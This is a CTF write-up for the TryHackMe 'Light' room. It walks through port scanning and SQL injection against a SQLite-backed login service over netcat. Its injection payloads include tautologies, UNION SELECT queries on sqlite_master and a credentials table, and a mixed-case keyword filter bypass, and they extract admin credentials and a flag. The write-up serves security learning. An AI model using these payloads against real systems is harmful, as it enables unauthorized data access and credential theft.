---
title: "Light"
date: 2025-01-18T09:36:24+01:00
draft: false
hidden: false
tags:
    - ctf
    - writeup
    - tryhackme
summary: ""
---

|Revised Date | Author | Comment |
| ----------- | ------ | ------- |
| 19.01.2025  | Roger Johnsen | Article added |

## Introduction

>_I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337
You can use the username smokey in order to get started._
>
>_Note: Please allow the service 2 - 3 minutes to fully start before connecting to it._

Availability: https://tryhackme.com/r/room/lightroom

--- 

## Portscanning

```bash
nmap -sS -Pn -p- 10.10.199.201 -oN scan.txt

# Nmap 7.94SVN scan initiated Sat Jan 18 12:34:04 2025 as: /usr/lib/nmap/nmap --privileged -sS -Pn -p- -oN scan.txt 10.10.199.201
Nmap scan report for 10.10.199.201
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
```

## Enumerating service

```bash
nc 10.10.199.201 1337

Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
Please enter your username: --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```
Initial prodding of the login prompt reveals the following:  

- If a username exists, the system returns and displays the associated password.  
- The prompt suggests a database is involved, making SQL injection the most likely vulnerability.  
- Inserting a single quotation mark (`'`) results in an SQL error.  
- Input filtering appears to be in place.  

```bash
nc 10.10.199.201 1337
Welcome to the Light database!

Please enter your username: 
Password: tF8tj2o94WE4LKC
Please enter your username: ' or username like 'a%
Password: tF8tj2o94WE4LKC
Please enter your username: ' or username like 'x%
Username not found.
Please enter your username:
```

Further prodding using the following payloads:

| Payload | Result | 
| ------- | ------ |
| ```' or '1'='1``` | Returns a different password than for "smokey" |
| ```' or username like 'a%``` | Returns the same password as above mentioned "OR" statement |
| ```' or username like 'x%``` | No user founds. Verification that I have guessed the correct column and that there are no users starting with "x" | 

#### The hints

The room's description states, *"I am working on a database application called Light."* The room itself is named *"Light,"* and the URL for the room is *"/lightroom."* Seeing these in combination, it seems likely that we are dealing with SQLite - phonetically, it makes sense. Therefore, I will base my investigation on this assumption moving forward.  

## Enumerating database

### Tables

For standard querying, listing tables in SQLite can be accomplished with the following query, which we will exploit shortly:

```sql
SELECT name FROM sqlite_master WHERE type = 'table' ORDER BY name;
```

When applied to the application's input, we get something like this:

```sql
x' Union SELECT name FROM sqlite_master WHERE type='table
```

Putting this into practice:

```bash
nc 10.10.147.110 1337

Welcome to the Light database!
Please enter your username: x' UNION SELECT name FROM sqlite_master WHERE type='table
Ahh there is a word in there I don't like :(
Please enter your username: 
```

While debugging, it seems the backend does not accept the "SELECT" keyword, even in lowercase. However, this works:  

```bash
nc 10.10.147.110 1337

Welcome to the Light database!
Please enter your username: x' Union Select name FROM sqlite_master WHERE type='table
Password: admintable
Please enter your username: 
```

### Users

We now know the table name, "admintable." Let's see if we can retrieve its contents! We'll use the same logic as above:

```sql
x' Union Select username FROM admintable WHERE username like '%
```

Putting this into practice:

```bash
nc 10.10.147.110 1337

Welcome to the Light database!
Please enter your username: x' Union Select username FROM admintable WHERE username like '%
Password: T*************
Please enter your username: T*************
Username not found.
Please enter your username:
```

Although we can extract the username, we cannot retrieve the password by simply entering the username at the prompt. However, we must use SQL injection once again:

```sql
x' Union Select password FROM admintable WHERE username like 'T%
```

Putting this into practice:

```bash
nc 10.10.147.110 1337

Welcome to the Light database!
Please enter your username: x' Union Select password FROM admintable WHERE username like 'T%
Password: m*******************
Please enter your username: 
```

At this point, I thought I could simply SSH into the machine and retrieve the flag. Unfortunately, the credentials didn’t work. So, I decided to revisit probing the database.

### Flag

It appears that there is only one table in the database. Perhaps there is more content I'm not aware of? I’m trying this route without looking at the username I recently found:

```sql
x' Union Select password FROM admintable WHERE username not like 'T%
```

Putting this into practice:

```bash
nc 10.10.147.110 1337         
Welcome to the Light database!
Please enter your username: x' Union Select password FROM admintable WHERE username not like 'T%
Password: THM{******************************}
Please enter your username:
```

And there’s the flag.